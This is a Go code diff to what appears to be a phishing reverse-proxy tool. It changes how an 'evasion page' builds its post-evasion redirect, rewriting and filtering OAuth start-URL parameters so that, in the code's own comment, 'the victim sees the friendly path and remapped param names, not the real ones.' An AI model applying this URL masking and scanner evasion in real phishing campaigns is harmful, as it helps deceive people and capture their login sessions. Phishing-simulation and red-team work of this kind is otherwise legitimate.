@@ -4506,17 +4506,89 @@ func (m *ProxyHandler) checkAndServeEvasionPage(req *http.Request, reqCtx *Reque
 		}
 	}
 
-	// preserve the original URL without campaign parameters for post-evasion redirect
-	originalURL := req.URL.Path
-	if req.URL.RawQuery != "" {
-		// parse query params and remove campaign recipient ID
-		query := req.URL.Query()
-		if reqCtx.ParamName != "" {
-			query.Del(reqCtx.ParamName)
+	// build the post-evasion redirect url using the start url as the source of truth for
+	// path and query params — the incoming request only has the campaign id param, not the
+	// real start url params (client_id, redirect_uri etc.). apply rewrite_urls rules so the
+	// victim sees the friendly path and remapped param names, not the real ones.
+	var startPath string
+	var startQuery url.Values
+	if reqCtx.ProxyEntry != nil {
+		if startURLVal, err := reqCtx.ProxyEntry.StartURL.Get(); err == nil {
+			if parsedStart, err := url.Parse(startURLVal.String()); err == nil {
+				startPath = parsedStart.Path
+				startQuery, _ = url.ParseQuery(parsedStart.RawQuery)
+			}
 		}
-		if len(query) > 0 {
-			originalURL += "?" + query.Encode()
+	}
+	if startPath == "" {
+		startPath = req.URL.Path
+	}
+	if startQuery == nil {
+		startQuery = url.Values{}
+	}
+
+	// collect rewrite_urls rules — host-specific first, then global
+	var rewriteRules []service.ProxyServiceURLRewriteRule
+	if hostCfg, ok := reqCtx.ProxyConfig.Hosts[reqCtx.TargetDomain]; ok && hostCfg != nil {
+		rewriteRules = append(rewriteRules, hostCfg.RewriteURLs...)
+	}
+	if reqCtx.ProxyConfig.Global != nil {
+		rewriteRules = append(rewriteRules, reqCtx.ProxyConfig.Global.RewriteURLs...)
+	}
+
+	redirectPath := startPath
+	redirectQuery := startQuery
+
+	for _, rule := range rewriteRules {
+		pattern := strings.TrimPrefix(rule.Find, "^")
+		pattern = strings.TrimSuffix(pattern, "$")
+		re, reErr := regexp.Compile("^" + pattern)
+		if reErr != nil {
+			continue
 		}
+		if !re.MatchString(startPath) {
+			continue
+		}
+
+		// rewrite path to the friendly replacement
+		redirectPath = rule.Replace
+
+		// remap query param keys: find → replace
+		if len(rule.Query) > 0 {
+			remapped := url.Values{}
+			for k, v := range startQuery {
+				remapped[k] = v
+			}
+			for _, qRule := range rule.Query {
+				if vals, exists := remapped[qRule.Find]; exists {
+					delete(remapped, qRule.Find)
+					remapped[qRule.Replace] = vals
+				}
+			}
+			redirectQuery = remapped
+		}
+
+		// apply filter: keep only the listed query param names
+		if len(rule.Filter) > 0 {
+			allowed := make(map[string]struct{}, len(rule.Filter))
+			for _, name := range rule.Filter {
+				allowed[name] = struct{}{}
+			}
+			filtered := url.Values{}
+			for k, v := range redirectQuery {
+				if _, ok := allowed[k]; ok {
+					filtered[k] = v
+				}
+			}
+			redirectQuery = filtered
+		}
+
+		break
+	}
+
+	originalURL := redirectPath
+	if len(redirectQuery) > 0 {
+		originalURL += "?" + redirectQuery.Encode()
 	}
 
 	// this is initial request with campaign recipient ID and no state parameter, serve evasion page
